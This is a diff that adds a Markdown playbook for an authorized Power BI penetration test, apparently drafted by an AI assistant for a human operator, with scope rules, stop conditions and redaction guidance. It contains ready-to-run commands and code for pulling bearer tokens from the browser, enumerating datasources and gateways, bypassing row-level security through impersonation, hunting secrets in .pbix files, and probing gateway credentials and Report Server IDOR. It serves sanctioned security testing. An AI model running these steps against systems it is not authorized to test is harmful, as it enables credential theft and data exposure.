@@ -1,0 +1,348 @@
+# Power BI Penetration Test Methodology
+
+> **Version**: 0.1 (research draft — iterate after each engagement)
+> **Constraints**: Target is inside a private network. All testing performed from an authorized corporate workstation using **only**: web browser (Edge/Chrome + DevTools), PowerShell 5.1+ built-ins (`Invoke-RestMethod`, `Get-Service`, `Get-CimInstance`, `Expand-Archive`, etc.), and CMD built-ins. **No tool downloads.**
+> **Role split**: The operator (you) executes on the private network. The assistant (me) designs tests, interprets output, and adjusts the plan.
+
+---
+
+## 1. Power BI Attack Surface Model
+
+A Power BI estate exposes six distinct attack surfaces. Every engagement should map which of these exist before deep testing:
+
+| # | Surface | What it is | Typical findings |
+|---|---------|------------|------------------|
+| S1 | **Power BI Service (cloud)** | app.powerbi.com — workspaces, semantic models (datasets), reports, dashboards, dataflows, apps | Over-provisioned workspace roles, RLS gaps, over-sharing, publish-to-web |
+| S2 | **Power BI REST API** | api.powerbi.com — everything the UI does, plus admin/scanner APIs | Enumeration beyond intended visibility, executeQueries RLS abuse, embed token minting |
+| S3 | **On-premises Data Gateway** | `PBIEgwService` Windows service bridging cloud → internal DBs | Stored-credential recovery (host compromise = all datasource creds), over-privileged service account, Kerberos SSO/delegation abuse |
+| S4 | **Power BI Desktop artifacts** | `.pbix`/`.pbit`/`.pbip` files, local caches, autosave, DPAPI credential store | Full cached data disclosure, secrets in Power Query M code, internal hostnames |
+| S5 | **Power BI Report Server (on-prem)** | Self-hosted SSRS-style portal (`/reports`, `/reportserver`) | Anonymous access, IDOR in REST API v2, cached credentials, direct render/export |
+| S6 | **Identity layer (Entra ID)** | Licenses, tenant settings, service principals, guests, consent | Tenant-wide settings that weaken all of the above |
+
+**Key documented behaviors that drive the whole methodology:**
+1. **RLS is NOT applied to users holding Admin / Member / Contributor roles on a workspace** — only Viewers (and viewers with Build permission) are RLS-constrained. Over-provisioned roles = data exposure by design.
+2. **Datasets reachable via the `executeQueries` REST API can be queried with DAX**, including an `impersonatedUserName` parameter (requires elevated access on the dataset; ignored when the model has no RLS).
+3. **Gateway datasource credentials are only decryptable on the gateway host** — the cloud sends RSA-encrypted credentials; the private key lives in the gateway's local configuration protected by the gateway service account. Gateway host compromise ⇒ all stored datasource credentials.
+4. **Publish-to-web** embeds are fully anonymous on the internet with **no RLS applied** when enabled.
+5. A `.pbix` in import mode contains **the full cached dataset** plus the **entire Power Query (M) transformation code** — anyone with the file has the data.
+
+---
+
+## 2. Phase 0 — Scope & Rules of Engagement (15 min)
+
+Confirm before touching anything:
+
+- [ ] Written authorization covers: Power BI Service + Report Server (if present) + gateway hosts + file shares
+- [ ] **Explicit approval** before any *outward-facing* action: creating a publish-to-web link, sending a share link to any recipient (especially external), creating subscriptions
+- [ ] Two test accounts if available (User A = over-privileged, User B = restricted viewer) — cross-user proof needs them
+- [ ] Environment identified: S1–S6 surfaces present? (Answer after Phase 1.)
+- [ ] Evidence folder created; tokens redacted in all notes (`eyJhbGciOi…<SNIP>`)
+
+**Stop conditions**: tenant-wide changes, modifying datasets/reports of others without approval, disabling anything.
+
+---
+
+## 3. Phase 1 — Identity & Access Baseline (browser + PowerShell, 30 min)
+
+Goal: know exactly *who you are* in the tenant and *what your token can do*.
+
+### 1.1 Capture a Power BI bearer token (browser only)
+1. Sign in to `https://app.powerbi.com` in a normal browser window.
+2. F12 → **Network** tab → filter `api.powerbi.com` → reload the page (F5).
+3. Click any request (e.g. `groups?...`) → **Request Headers** → copy the full `Authorization: Bearer eyJ…` value.
+4. Tokens expire in ~60 min; re-grab on 401 responses.
+
+Alternative (DevTools Console on the app.powerbi.com tab — copies to clipboard):
+```js
+copy(Object.values(sessionStorage).map(v => { try { const o = JSON.parse(v); if (o.credentialType === 'AccessToken' && /powerbi|analysis\.windows\.net/.test(o.target)) return o.secret; } catch (e) {} }).filter(Boolean)[0])
+```
+
+### 1.2 Decode the token (PowerShell)
+```powershell
+function Get-JWTPayload {
+  param([string]$Token)
+  $p = $Token.Split('.')[1].Replace('-','+').Replace('_','/')
+  switch ($p.Length % 4) { 2 {$p+='=='} 3 {$p+='='} }
+  [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p)) | ConvertFrom-Json
+}
+$token = '<paste>'
+$claims = Get-JWTPayload $token
+$claims | Select aud, upn, tid, ver, appid
+$claims.roles        # application roles assigned to YOU
+$claims.wids         # Entra role template GUIDs (tenant-level admin roles)
+$claims.groups       # group memberships
+```
+Notable `wids` value: `62e90394-69f5-4237-9190-012177145e10` = Global Administrator. Any populated `roles` on a Power BI audience token is itself a finding worth investigating.
+
+### 1.3 Record the baseline
+- License (Free / Pro / Premium Per User / Fabric) — visible in Power BI UI under your account
+- Workspaces listed in the left nav + your role in each (workspace → Manage access / Access list)
+- Tenant ID, your UPN, whether MFA/CA policies blocked anything interesting
+
+**Deliverable**: token claims table + your-role-per-workspace table.
+
+---
+
+## 4. Phase 2 — Service Enumeration via REST (PowerShell, 45 min)
+
+Goal: map every workspace, dataset, datasource, gateway, and app your token can reach — and just as importantly, **map what returns 403** (the 200/403 pattern is your permission footprint).
+
+```powershell
+$token = '<paste>'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12   # PS 5.1
+$h = @{ Authorization = "Bearer $token" }
+$base = 'https://api.powerbi.com/v1.0/myorg'
+```
+
+### 2.1 Workspaces
+```powershell
+$groups = (Invoke-RestMethod "$base/groups" -Headers $h).value
+$groups | Select-Object id, name, type, state | Format-Table -AutoSize
+```
+
+### 2.2 Per-workspace inventory (reports, dashboards, datasets, dataflows, users)
+```powershell
+foreach ($g in $groups) {
+  "=== $($g.name)  [$($g.id)]"
+  foreach ($ep in 'users','reports','dashboards','datasets','dataflows') {
+    try {
+      $items = (Invoke-RestMethod "$base/groups/$($g.id)/$ep" -Headers $h).value
+      "  {0,-12} {1}" -f $ep, $items.Count
+      $items | ConvertTo-Json -Depth 8 | Out-File "pbi-$($g.id)-$ep.json" -Encoding utf8
+    } catch { "  {0,-12} ERROR {1}" -f $ep, $_.Exception.Response.StatusCode.value__ }
+  }
+}
+```
+From `pbi-<id>-users.json` record every user's `groupUserAccessRight` (Admin/Member/Contributor/Viewer) — this is your over-provisioning evidence list.
+
+### 2.3 Datasource disclosure per dataset (the money call)
+```powershell
+foreach ($g in $groups) {
+  $datasets = (Invoke-RestMethod "$base/groups/$($g.id)/datasets" -Headers $h -ErrorAction SilentlyContinue).value
+  foreach ($d in $datasets) {
+    try {
+      (Invoke-RestMethod "$base/groups/$($g.id)/datasets/$($d.id)/datasources" -Headers $h).value |
+        Select-Object datasourceType, connectionDetails, credentialType, singleSignOnType, gatewayId |
+        Format-List
+    } catch {}
+  }
+}
+```
+`connectionDetails` typically leaks **internal server hostnames, database names, and sometimes usernames**. Also pull `/parameters` (can contain API keys/URLs as plain text) and `/refreshes?$top=10` (refresh failures leak errors/paths).
+
+### 2.4 Gateways (if any dataset shows a gatewayId)
+```powershell
+$gw = (Invoke-RestMethod "$base/gateways" -Headers $h).value
+$gw | Select-Object * | Format-List
+foreach ($g in $gw) {
+  (Invoke-RestMethod "$base/gateways/$($g.id)/datasources" -Headers $h).value |
+    Select-Object datasourceType, connectionDetails, credentialType, singleSignOnType | Format-List
+}
+```
+Record every datasource where `credentialType` is `Basic` (username+password stored) and whether `singleSignOnType` is `Kerberos` (delegation surface).
+
+### 2.5 Apps, all-reports, subscriptions
+```powershell
+(Invoke-RestMethod "$base/apps" -Headers $h).value | Select-Object id, name
+(Invoke-RestMethod "$base/reports" -Headers $h).value | Select-Object id, name, webUrl, datasetId | Format-Table
+# per report:
+(Invoke-RestMethod "$base/groups/$gid/reports/$rid/subscriptions" -Headers $h).value
+```
+
+### 2.6 Admin-only (if your account has Fabric/Power BI admin)
+```powershell
+(Invoke-RestMethod "$base/admin/groups?`$top=500&`$expand=admin,users,reports,dashboards,datasets,dataflows" -Headers $h).value | Measure-Object
+# Scanner API (metadata + lineage for chosen workspaces):
+$body = @{ workspaces = @('<workspace-guid>'); lineage = $true; datasourceDetails = $true } | ConvertTo-Json
+Invoke-RestMethod -Method Post "$base/admin/workspaces/getInfo" -Headers $h -ContentType 'application/json' -Body $body
+```
+Non-admins: the 403s on `/admin/*` confirm you are NOT admin — record it; if a non-admin account *succeeds* on `/admin/*`, that is an immediate Critical.
+
+### 2.7 Fabric items (if tenant has Fabric)
+Grab a token from devtools while browsing Fabric items (different audience), then `GET https://api.fabric.microsoft.com/v1/workspaces` and `/v1/workspaces/{id}/items`.
+
+**Deliverable**: workspace/dataset/datasource/gateway inventory + the 200-vs-403 map.
+
+---
+
+## 5. Phase 3 — Data Model & RLS Attacks (browser + PowerShell, 60–90 min)
+
+### 3.1 Establish the RLS rules of the target datasets
+For each sensitive dataset answer:
+- Is RLS defined? (ask for the .pbix, check `Layout`/roles, or infer from business logic)
+- Who holds Admin/Member/Contributor on its workspace? → **all of them bypass RLS by design**
+- Who is Viewer? → RLS should apply to them
+
+### 3.2 Baseline (as yourself)
+1. Open the report; note exactly which rows/regions you see.
+2. Visual `⋯` → **Export data** — note allowed level (summary vs underlying data) and row counts.
+3. Try `…/reports/{id}/edit` URL as a Viewer — you should be bounced to read-only; a Viewer landing in the editor is a misconfiguration.
+
+### 3.3 RLS bypass tests (run in this order, record every result)
+| # | Test | How | Signal |
+|---|------|-----|--------|
+| T1 | **Partial-RLS / missing table roles** | With Build permission: create a new report on the dataset, drag fields from *every* table (dimensions, not just the RLS'd fact table) | Tables with no RLS role defined render in full — classic finding |
+| T2 | **executeQueries as self** | `POST /groups/{gid}/datasets/{dsid}/executeQueries` with `EVALUATE COUNTROWS('Table')` | 200 = you can query the model directly; note the count vs what the report shows you |
+| T3 | **executeQueries with impersonation** | Same call with `"impersonatedUserName": "other.user@tenant"` | 200 with another user's row visibility = you can read the dataset as anyone |
+| T4 | **Embed token with effectiveIdentity** | `POST /groups/{gid}/reports/{rid}/GenerateToken` with identities/roles | Success minting a token with a role you don't hold = RLS bypass |
+| T5 | **Analyze in Excel** | Report `⋯` → Analyze in Excel (pivot over the live model) | Check pivots against your expected row set |
+| T6 | **URL parameter / filter manipulation** | Edit URL filter params (`?filter=…`, report-level `filterDefs`), bookmarks, drillthrough | Visuals return other tenants'/regions' rows |
+
+T2/T3 body:
+```powershell
+$gid='<workspace-guid>'; $did='<dataset-guid>'
+$body = @{ queries = @(@{ query = "EVALUATE ROW(`"n`", COUNTROWS('TableName'))" }) } | ConvertTo-Json -Depth 6
+Invoke-RestMethod -Method Post "$base/groups/$gid/datasets/$did/executeQueries" -Headers $h -ContentType 'application/json' -Body $body
+# T3 - add:  impersonatedUserName = 'other.user@tenant.com'
+```
+Schema discovery (if the API is open to you): `EVALUATE INFO.VIEW.TABLES()` / `INFO.VIEW.COLUMNS()` on newer models (fallback: read the field list in edit view; older engines accept `INFO.TABLES()`).
+
+> Note: `executeQueries` requires Write-level access to the dataset and there is a tenant setting that can disable it — capture the exact error text either way; the error message itself tells us the boundary.
+
+### 3.4 Over-provisioned role impact proof
+If you (or a test account) hold Contributor+ on a "finance/HR-only" workspace while being an ordinary user: that *is* the finding. Prove impact with T2 (full row count of the sensitive table) — done.
+
+---
+
+## 6. Phase 4 — Sharing & Exposure Misconfigurations (browser, 45 min)
+
+⚠️ Only with ROE approval — these create artifacts/notifications.
+
+| # | Test | Method | Finding if… |
+|---|------|--------|-------------|
+| P1 | **Publish-to-web availability** | Report → File → Embed report → *Website or portal* | A public `app.powerbi.com/view?r=…` link is generated (anonymous, no RLS). **Delete the link immediately after recording evidence.** |
+| P2 | Existing publish-to-web embeds | Search engine: `site:app.powerbi.com/view` + check public sites/SharePoint | Any tenant report found publicly |
+| P3 | **Share link scope** | Report → Share → inspect the dropdown | "Anyone with the link" / "People in <org> with the link" available to a low-priv user; "Allow recipients to reshare" enabled |
+| P4 | **Link forwarding** | Send a specific-people link to test account B (internal) | B gains access without being on the ACL |
+| P5 | **External guest sharing** | Attempt to share to an external address (if approved) | Invitation succeeds / guest can view |
+| P6 | **App over-distribution** | Apps list → check audiences ("entire organization" audiences) | Org-wide app containing sensitive dashboards |
+| P7 | **Subscriptions** | Report → Subscribe | Can subscribe; check whether subscription emails include full snapshots of data you can't see in the report |
+| P8 | **Export/download controls** | Export data + File → Download report (.pbix) | Viewers can download .pbix of a report they only partially see → they get the *entire* dataset |
+| P9 | **Tenant settings review (needs admin)** | Admin portal → Tenant settings | Record: publish-to-web mode, export/download, guest access, XMLA endpoint read-write, service principals, executeQueries API toggle, workspace creation rights |
+
+P8 is the single most common high-impact finding: **a .pbix download by a Viewer exports the whole model, not the filtered view.**
+
+---
+
+## 7. Phase 5 — Local & On-Prem Attacks (PowerShell + browser, 60–90 min)
+
+### 5.1 PBIX hunting (workstation + accessible file shares/Teams/SharePoint)
+```powershell
+$roots = "$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","\\fileserver\share"   # adjust
+foreach ($r in $roots) {
+  Get-ChildItem $r -Recurse -Include *.pbix,*.pbit,*.pbip -ErrorAction SilentlyContinue |
+    Select-Object FullName, Length, LastWriteTime
+}
+```
+Teams/SharePoint: search `*.pbix` / "filetype:pbix" in SharePoint search UI.
+
+### 5.2 PBIX autopsy (built-ins only — a pbix is a ZIP)
+```powershell
+Copy-Item .\report.pbix .\report.zip -Force
+Expand-Archive .\report.zip -DestinationPath .\pbix -Force
+Get-ChildItem .\pbix -Recurse | Select-Object FullName
+
+# Power Query M code (connections, credentials, internal hosts):
+Copy-Item .\pbix\DataMashup .\dm.zip -Force
+Expand-Archive .\dm.zip -DestinationPath .\dm -Force
+Get-Content .\dm\Formulas\Section1.m
+
+# Report definition (UTF-16 JSON) — hunt secrets/URLs:
+$raw = Get-Content .\pbix\Report\Layout -Encoding Unicode -Raw
+[regex]::Matches($raw,'https?://[^\\"\s]+') | ForEach-Object {$_.Value} | Sort-Object -Unique
+[regex]::Matches($raw,'(?i)(passw|secret|token|apikey|bearer)[^,}\]]{0,60}') | ForEach-Object {$_.Value} | Select-Object -Unique -First 40
+
+# Live/DirectQuery models: read the connection file
+Get-Content .\pbix\Connections
+```
+- `DataModel` (import mode) = full cached dataset — **open it in Power BI Desktop and every table is visible** (no creds needed for cached data).
+- `DataMashup`/`Section1.m` = all M code — grep for `password=`, `apiKey`, `Token.Sys`, `Authorization`, internal hostnames.
+- `Report/Layout` = schema (every column name), visual defs, embedded URLs.
+
+### 5.3 Power BI Desktop workstation artifacts
+```powershell
+Get-Service | Where-Object { $_.DisplayName -match 'gateway|power\s*bi' } | Format-Table Name,DisplayName,Status
+Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Power BI Desktop" -Recurse -ErrorAction SilentlyContinue |
+  Select-Object FullName, Length, LastWriteTime | Out-File pbi-desktop.txt
+Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Filter *.lnk | Where-Object { $_.Name -match '\.pb' }
+```
+Look for: `AutoSave` (unsaved report copies), `Temp*` model caches, any file named `*credential*` (DPAPI blobs — decryptable only in that user's context, which is the situation when you're on a user's box in a pentest).
+
+### 5.4 On-premises data gateway (if you get access to a gateway host)
+```powershell
+Get-CimInstance Win32_Service | Where-Object { $_.PathName -match 'gateway|PBIEgw|PowerBI' } |
+  Select-Object Name, StartName, State, PathName | Format-List          # <-- the SERVICE ACCOUNT (often over-privileged in AD)
+Get-ChildItem 'C:\Program Files\On-premises data gateway' -ErrorAction SilentlyContinue | Select-Object Name,Length,LastWriteTime
+net user <gateway-svc-account> /domain                                    # domain rights of the service account
+```
+Collect (copy, don't move): `GatewayInfo.json`, `GatewayConfig.json`, `Microsoft.PowerBI.DataMovement.Pipeline.GatewayCore.dll`, and any per-datasource config blobs. **Documented architecture: credentials for every datasource are RSA-encrypted and only decryptable on the gateway host with key material protected by the gateway service account — so gateway host admin access should be treated as "all datasource credentials".** If you have the gateway recovery key (obtain per ROE) stored credentials can be decrypted offline; otherwise record host + service account as the escalation path.
+Kerberos SSO datasources (`singleSignOnType: Kerberos`) → check the service account's SPNs/delegation (`setspn -L <account>`); constrained/unconstrained delegation = domain escalation surface.
+
+### 5.5 Power BI Report Server (on-prem, if in scope)
+```text
+Portal:    https://<host>/reports
+Service:   https://<host>/reportserver
+REST API:  https://<host>/reports/api/v2.0/Me, /Folders, /Reports, /PowerBIReports, /CatalogItems
+```
+- Browse `/reports` unauthenticated → expect 401; anything else is a finding.
+- Authenticated: enumerate `/reports/api/v2.0/PowerBIReports` — compare against what the UI shows you; items viewable via direct API/path but hidden in UI = IDOR.
+- Classic SSRS URL access: `https://<host>/reportserver?/Folder/Report&rs:Command=Render&rs:Format=CSV` (also try `EXCELOPENXML`, `PDF`) — render/export reports your role shouldn't reach.
+- `GET /reportserver?/Folder/SharedDataSource&rs:Command=GetDataSourceDefinition` can leak connection strings on misconfigured instances.
+
+---
+
+## 8. Escalation Decision Tree
+
+Answer in order; each YES below is a live escalation path:
+
+1. **Token `roles`/`wids` populated with admin roles?** → tenant-level escalation — go straight to admin APIs (§2.6).
+2. **Any `/admin/*` call returns 200 for a non-admin account?** → immediate Critical (tenant-wide read).
+3. **Contributor/Member/Admin on any workspace containing data you shouldn't see?** → RLS is bypassed by design for you — prove with executeQueries full-count (T2). This is the role over-provisioning finding.
+4. **`executeQueries` returns 200 with `impersonatedUserName` of another user?** → read any user's slice of every dataset in reach.
+5. **Viewer can download .pbix of a partially-visible report?** → full model data disclosure.
+6. **Any datasource `credentialType: Basic` behind a gateway?** → pivot: gateway host → recover stored creds → direct DB access with a real service credential.
+7. **`singleSignOnType: Kerberos` on gateway?** → examine service account delegation → potential domain escalation.
+8. **Publish-to-web allowed?** → any report can be made anonymously public with zero RLS.
+9. **"Anyone with the link" / org-wide links available to low-priv users?** → uncontrolled lateral data spread.
+10. **PBIX files on shares/Teams/SharePoint?** → open in Desktop = full cached data + M-code secrets (creds, internal hosts) → internal-network recon + possible direct system access.
+11. **Datasets with no RLS at all but sensitive data?** → every Viewer sees everything — access model failure.
+12. **Report Server IDOR on `/reports/api/v2.0` or `rs:Command=Render`?** → on-prem data exposure.
+
+---
+
+## 9. Severity Anchors (calibrate per client context)
+
+| Finding | Typical severity |
+|---|---|
+| Publish-to-web enabled + sensitive report published | Critical |
+| Gateway credential recovery / gateway host compromise path | Critical |
+| Non-admin succeeding on admin APIs | Critical |
+| RLS bypass via impersonation / embed token identity | High–Critical |
+| Over-provisioned workspace role exposing sensitive data (Contributor+ on finance/HR) | High |
+| Viewer .pbix download of partially-visible model | High |
+| Datasets without RLS containing sensitive data | High |
+| IDOR in PBIRS REST/URL access | High |
+| Internal hostname/connection-string disclosure via datasources API | Medium (info for internal attack) |
+| Over-shared org-wide links/apps | Medium |
+| Export controls missing | Low–Medium |
+
+---
+
+## 10. Evidence & Logging Standards
+
+Every test gets one row: `ID | phase | test | exact command/action | HTTP status | observed result | screenshot/log file | pass/fail/inconclusive`.
+- Screenshot every browser finding (full URL bar visible).
+- Save every API response to a JSON file (the runbook scripts already do).
+- **Redact all tokens** in notes: `eyJhbGciOi…<SNIP>`. Never paste full tokens into shared documents.
+- Delete every artifact you created (share links, PTW embeds, test reports, subscriptions) and record the deletion.
+
+---
+
+## 11. References
+
+- Microsoft Learn — Datasets Execute Queries REST API (`impersonatedUserName`): https://learn.microsoft.com/rest/api/power-bi/datasets/execute-queries
+- Microsoft Learn — On-premises data gateway architecture (credential encryption model): https://learn.microsoft.com/data-integration/gateway/service-gateway-onprem-indepth
+- Microsoft Learn — Row-level security (RLS) with Power BI (role/bypass behavior)
+- Microsoft Learn — Power BI REST API reference (groups/gateways/datasets/admin/scanner)
+- Microsoft Learn — Power BI Report Server REST API v2
+- Public Power BI red-team research (Fred Academy "Power BI Red Team" methodology, PowerHunt/PowerHuntShares tooling docs — read for technique reference; we replicate manually given the no-download constraint)
